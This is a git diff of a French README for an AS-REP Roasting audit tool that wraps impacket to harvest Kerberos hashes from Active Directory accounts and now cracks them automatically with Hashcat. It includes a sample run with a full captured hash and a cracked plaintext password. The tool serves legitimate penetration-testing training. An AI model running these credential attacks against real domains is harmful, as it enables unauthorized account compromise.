@@ -1,8 +1,8 @@
 # AS-Rep-Roaster
 
-Outil Python d'audit Active Directory orienté AS-REP Roasting, conçu pour un usage pédagogique dans un environnement de lab autorisé.
+Outil Python d'audit Active Directory orienté AS-REP Roasting, conçu pour un usage pédagogique dans un environnement autorisé.
 
-Ce projet automatise la détection de comptes Active Directory vulnérables à l'AS-REP Roasting (comptes avec la pré-authentification Kerberos désactivée), récupère les hashes exploitables via l'outil `impacket-GetNPUsers`, puis génère un rapport et un export compatible Hashcat.
+Ce projet automatise la détection de comptes Active Directory vulnérables à l'AS-REP Roasting (comptes avec la pré-authentification Kerberos désactivée), récupère les hashes exploitables via l'outil `impacket-GetNPUsers`, génère un rapport et un export compatible Hashcat, et peut lancer automatiquement le cassage des hashes via Hashcat.
 
 ---
 
@@ -22,40 +22,24 @@ Ce projet s'appuie sur `impacket-GetNPUsers` (Fortra/Impacket) comme moteur d'é
 - Parsing automatique des réponses AS-REP retournées
 - Affichage clair des comptes roastables et non roastables
 - Sélection interactive en terminal des comptes à exporter
-- Génération d'un rapport texte final
+- Génération d'un rapport texte final (`[ROASTABLE]` / `[X]` / `[CRACKED]`)
 - Export séparé des hashes au format compatible Hashcat (mode **18200** pour etype 23)
+- **Cracking automatique intégré** des hashes exportés via Hashcat, avec injection du mot de passe cassé directement dans le rapport
 
----
+## Prérequis
 
-## Architecture
-
-AS-Rep-Roaster/
-├── README.md
-├── requirements.txt
-├── Roaster.py
-└── asrep_Roaster/
-  ├── models.py # Modèle de données ADUser
-  ├── enum.py # Chargement et traitement de la liste d'utilisateurs
-  ├── asrep.py # Wrapper subprocess autour d'impacket-GetNPUsers
-  ├── report.py # Génération des fichiers de sortie
-  └── cli.py # Argparse et interface terminal interactive
-
-  ## Installation
-
-```bash
-git clone https://github.com/Gabriel-P-IT/AS-Rep-Roaster.git
-cd AS-Rep-Roaster
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-```
-
+- Python 3.10 ou supérieur
+- [Impacket](https://github.com/fortra/impacket) installé avec le binaire `impacket-GetNPUsers` disponible dans le `PATH`
+- [Hashcat](https://hashcat.net/hashcat/) installé et disponible dans le `PATH` (uniquement si l'option `--crack` est utilisée)
+  
 ## Utilisation
 
 ```bash
 python3 Roaster.py -h
 
 usage: Roaster.py [-h] -u USERS -d DOMAIN -dc-ip DC_IP [-o OUTPUT] [--hashes HASHES]
+[--crack] [--wordlist WORDLIST] [--rules RULES]
+[--crack-timeout CRACK_TIMEOUT]
 
 AS-REP Roasting Audit Tool (Lab)
 
@@ -67,12 +51,42 @@ options:
 Domain controller IP address
 -o, --output OUTPUT Final report file
 --hashes HASHES Hashcat-compatible export file (mode 18200)
+--crack Automatically crack exported hashes with hashcat
+--wordlist WORDLIST Wordlist path used for automatic cracking (default: /usr/share/wordlists/rockyou.txt)
+--rules RULES Optional hashcat rules file (e.g. best64.rule)
+--crack-timeout SECONDS Max seconds allowed for the cracking phase (default: 600)
 ```
 
-## Cracking avec Hashcat
-
+## Exemple de sortie
 ```bash
-hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+┌─[eu-dedivip-1]─[10.10.X.X]─[ys4@ys4]─[~/AS-Rep-Roaster]
+└──╼ [★]$ python3 Roaster.py -u users.txt --hashes hash.txt -dc-ip 10.129.95.180 -d domain.local --crack --wordlist /usr/share/wordlists/rockyou.txt
+[*] Loading users from users.txt
+[*] Enumerating against domain.local (10.129.95.180) using impacket-GetNPUsers...
+
+--- Enum results ---
+[0] fsmith - ROASTABLE
+
+Enter the user numbers to export (separated by commas), or 'all' for all of them:
+> 0
+[*] Generating report to report.txt
+[*] Exporting hashes to hash.txt
+[*] Starting automatic cracking with wordlist: /usr/share/wordlists/rockyou.txt
+[+] Done.
+
+┌─[eu-dedivip-1]─[10.10.X.X]─[ys4@ys4]─[~/AS-Rep-Roaster]
+└──╼ [★]$ cat hash.txt 
+# Hashcat mode 18200
+$krb5asrep$23$fsmith@domain.LOCAL:4e9f33ef4f5f040ecf277398105d5c1a$f89fc5137c5448f1f3028840d80a5c3fd5cf4a9f2bd6ff036d15935aeaff3ae7709a6bc0f8eff123e23bec91035d3f0a8fca025211bd3bb14b18d9f47a5c582563cadc99b47d1c55df1a562b938cfa513ca47909a99ca7f93b5440eeefa2ea96909b3261789fc5a90e8c3555d78cac4f3e6b8b3826cfd66c4f77e10e54063fde814fdbeb5e1969abecf07ee6e39446581c0233100ae2ebcca33b4936778d5d1a5aa6b18e56a32b81efcf1f9ef24aa4035d4cfb89df1a91b45ae01f28e5706e1596dc98628f8cce76baccc41840db730c94d313384837b1599c5bf05304b165a8c917f158727b6c56722ee1c5bd35964a15ddbf665f0e7a39210f8189881a64a2
+
+┌─[eu-dedivip-1]─[10.10.X.X]─[ys4@ys4]─[~/AS-Rep-Roaster]
+└──╼ [★]$ cat report.txt 
+[X] testuser - No exploitable hash
+[X] helloworld - No exploitable hash
+[ROASTABLE] fsmith - $krb5asrep$23$fsmith@domain...
+
+--- Cracked passwords ---
+[CRACKED] fsmith : Thestrokes23
 ```
 
 ## Avertissement légal
@@ -86,14 +100,6 @@ Toute utilisation contre un système sans autorisation explicite est illégale e
 
 
 ## Roadmap — Améliorations futures
-
-### Cracking automatique intégré
-
-- Ajouter une option `--crack` déclenchant automatiquement Hashcat en mode 18200 (ou 17600/18200 selon l'etype détecté) directement après l'export, sans étape manuelle.
-- Intégrer un wordlist par défaut configurable (`--wordlist rockyou.txt`) avec détection de présence du fichier avant lancement.
-- Afficher en fin de rapport les mots de passe cassés en clair, associés au bon utilisateur, dans une section dédiée `[CRACKED]`.
-- Ajouter un mode `--rules` pour appliquer des règles Hashcat (best64.rule, OneRuleToRuleThemAll) et augmenter le taux de succès sur des mots de passe proches d'un dictionnaire.
-- Gérer un timeout ou un budget de temps de cracking configurable, pour éviter un blocage indéfini sur un gros wordlist.
 
 ### Discrétion accrue de l'énumération
 
